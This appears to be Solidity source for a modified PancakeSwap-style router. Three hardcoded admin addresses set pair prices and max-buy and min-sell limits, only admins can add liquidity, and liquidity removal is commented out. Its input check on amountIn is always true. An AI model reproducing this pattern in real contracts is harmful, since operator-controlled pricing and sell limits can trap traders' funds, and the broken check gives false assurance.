pragma solidity =0.6.6;

interface IPancakeFactory {
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function routerAddress() external view returns (address);
    function usdtAddress() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function pairMaxBuyUsdt(address pair) external view returns (uint256 maxBuyUsdt);
    function pairMinSellToken(address pair) external view returns (uint256 minSellToken);

    function createPair(address tokenA, address tokenB, uint initPrice, uint lowPrice, uint floatPrice, uint256 maxBuyUsdt, uint256 minSellToken) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function setPairMaxBuyUsdt(address pair, uint256 maxBuyUsdt) external;
    function setPairMinSellToken(address pair, uint256 minSellToken) external;
}

interface IPancakePair {
    event Swap(address indexed sender, address tokenA, address tokenB, uint coinNum, uint prePrice, uint nowPrice);
    event RemovePair(address indexed sender, address token0, address token1, uint balance0, uint balance1, address to);

    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function initPrice() external view returns (uint);
    function lowPrice() external view returns (uint);
    function nowPrice() external view returns (uint);
    function floatPrice() external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(address tokenA, address tokenB, uint256 coinNum, address to) external;
    function getSwapOut(address tokenA, address tokenB, uint256 coinNum) external view returns (uint256 getCoinNum, uint256 nowPrice);
    function update() external;
    //function removePair(address to) external returns (uint amount0, uint amount1);
    function initialize(address _token0, address _token1, uint _initPrice, uint _lowPrice, uint _floatPrice) external;
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}


// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)
library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }

    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)
    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

library PancakeLibrary {
    using SafeMath for uint;

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'PancakeLibrary: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'PancakeLibrary: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'c1c4e6bda72f0ca6bc7456ca64b6b851ca96c89c847f66ac7fdf9c1b323c9d2f' // init code hash
            ))));

        //pair = computeAddress(hex'ff', factory, keccak256(abi.encodePacked(token0, token1)), hex'bde09c9e6dbb8eb3cb7f9385d68a10e00668405898077bc15b8b4dec3a5c3d1a');
    }

    // fetches and sorts the reserves for a pair
    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {
        (address token0,) = sortTokens(tokenA, tokenB);
        pairFor(factory, tokenA, tokenB);
        (uint reserve0, uint reserve1,) = IPancakePair(pairFor(factory, tokenA, tokenB)).getReserves();
        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
    }

    function getNowPrice(address factory, address tokenA, address tokenB) internal view returns (uint nowPrice) {
        (address token0,) = sortTokens(tokenA, tokenB);
        pairFor(factory, tokenA, tokenB);
        nowPrice = IPancakePair(pairFor(factory, tokenA, tokenB)).nowPrice();
    }

    function getFloatPrice(address factory, address tokenA, address tokenB) internal view returns (uint floatPrice) {
        (address token0,) = sortTokens(tokenA, tokenB);
        pairFor(factory, tokenA, tokenB);
        floatPrice = IPancakePair(pairFor(factory, tokenA, tokenB)).floatPrice();
    }

    function getLowPrice(address factory, address tokenA, address tokenB) internal view returns (uint floatPrice) {
        (address token0,) = sortTokens(tokenA, tokenB);
        pairFor(factory, tokenA, tokenB);
        floatPrice = IPancakePair(pairFor(factory, tokenA, tokenB)).lowPrice();
    }
}

contract PancakeRouter {
    using SafeMath for uint;

    address public immutable factory;
    //address public immutable WETH;
    address public immutable admin1 = 0x3f233C99c3f74C3F9dB4d3DBdc2e9F8c327B9Af4;
    address public immutable admin2 = 0xcB23f085c3F4F80461541aac3B797Cdb71a3Fdb2;
    address public immutable admin3 = 0xBaacA7bA7d08e42200d4afD215c9D3086Aceb67C;

     modifier onlyOwner(address op) {
        require(op == IPancakeFactory(factory).feeToSetter() || op == admin1 || op == admin2 || op == admin3, 'Pancake: FORBIDDEN');
        _;
    }

    constructor(address _factory) public {
        factory = _factory;
    }

    function createPairByAdmin(
        address tokenA,
        address tokenB,
        uint initPrice,
        uint lowPrice,
        uint floatPrice,
        uint256 maxBuyUsdt,
        uint256 minSellToken
    ) external virtual onlyOwner(msg.sender) returns (address pair) {
        pair = IPancakeFactory(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            pair = IPancakeFactory(factory).createPair(tokenA, tokenB, initPrice, lowPrice, floatPrice, maxBuyUsdt, minSellToken);
        }
    }
    
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountA,
        uint amountB) 
        external virtual onlyOwner(msg.sender) {
        address pair = PancakeLibrary.pairFor(factory, tokenA, tokenB);
        if(amountA > 0) TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);
        if(amountB > 0) TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);
        IPancakePair(pair).update();
    }

    // **** REMOVE LIQUIDITY ****
    // function removeLiquidity(
    //     address tokenA,
    //     address tokenB,
    //     address to
    // ) public {
    //     require(msg.sender == IPancakeFactory(factory).feeToSetter() || msg.sender == admin1 || msg.sender == admin2, 'Pancake: FORBIDDEN');
    //     address pair = PancakeLibrary.pairFor(factory, tokenA, tokenB);
    //     IPancakePair(pair).removePair(to);
    // }

    function swapExactTokensForTokensV2(
        address tokenA,
        address tokenB,
        uint amountIn,
        address to    
    ) external returns (uint amounts) {
        require(amountIn >= 0, 'PancakeRouter: INSUFFICIENT_INPUT_AMOUNT');
       
        address pair = PancakeLibrary.pairFor(factory, tokenA, tokenB);
        TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountIn);
        IPancakePair(pair).swap(tokenA, tokenB, amountIn, to);
        IPancakePair(pair).update();
    }

    function getSwapOut(address tokenA, address tokenB, uint256 coinNum) external view returns (uint256, uint256) {
        address pair = PancakeLibrary.pairFor(factory, tokenA, tokenB);
        (uint256 getCoinNum, uint256 nowPrice) = IPancakePair(pair).getSwapOut(tokenA, tokenB, coinNum);
        return (getCoinNum, nowPrice);
    }

    function setPairMaxBuyUsdt(address pair, uint256 maxBuyUsdt) external onlyOwner(msg.sender) {
        IPancakeFactory(factory).setPairMaxBuyUsdt(pair, maxBuyUsdt);
    }



    function setPairMinSellToken(address pair, uint256 minSellToken) external onlyOwner(msg.sender) {
        IPancakeFactory(factory).setPairMinSellToken(pair, minSellToken);
    }
}